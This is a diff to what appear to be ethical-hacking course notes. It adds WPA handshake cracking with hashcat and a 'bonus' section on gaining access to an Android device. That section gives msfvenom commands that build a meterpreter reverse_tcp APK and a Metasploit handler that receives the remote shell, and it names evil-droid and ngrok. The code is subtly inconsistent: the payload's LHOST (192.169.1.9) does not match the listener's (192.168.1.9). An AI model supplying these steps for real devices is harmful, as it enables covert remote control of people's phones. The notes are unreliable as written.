@@ -223,3 +223,25 @@ hashcat --help
 # converse cap to hccapx (google cap to hccapx)
 hashcat -a 0 -m 2500 1b05515dbe.hccapx rockyou.txt 
 ```
+
+## Section 17: Bonus: Gaining Access To An Android Device
+* Android VM Install (x86 7.1 R3)
+  * Video Memory: 40MB
+  * Graphic Controller: VBoxSVGA
+* Andriod Meterpreter
+```bash
+msfvenom -p android/meterpreter/reverse_tcp LHOST=192.169.1.9 LPORT=5555 -o shell.apk
+# transfer shell.apk to the android
+# set up the listening in msfconsole
+msf5 > use exploit/multi/handler
+msf5 expliot(multi/handler) > set payload android/meterpreter/reverse_tcp
+msf5 expliot(multi/handler) > set LHOST 192.168.1.9
+msf5 expliot(multi/handler) > set LPORT 5555
+msf5 expliot(multi/handler) > run
+```
+* Evil Droid
+```bash
+./evil-droid
+```
+* apktool
+* ngrok
